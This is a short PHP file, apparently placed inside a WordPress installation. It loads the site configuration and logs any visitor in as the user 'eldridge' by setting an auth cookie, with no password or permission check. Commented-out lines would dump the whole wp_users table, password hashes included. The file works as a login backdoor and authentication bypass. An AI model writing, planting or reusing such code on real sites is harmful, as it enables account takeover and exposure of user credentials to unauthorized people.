 <?php require_once("../../../wp-config.php");

 $user = get_user_by('login', 'eldridge');
                            wp_clear_auth_cookie();
                            wp_set_current_user($user->ID);                         
                             wp_set_auth_cookie($user->ID);

 // global $wpdb;

 // $data=$wpdb->get_results('select * from `wp_users`');
 // echo"<pre>";
 // print_r($data);
 // echo"</pre>";


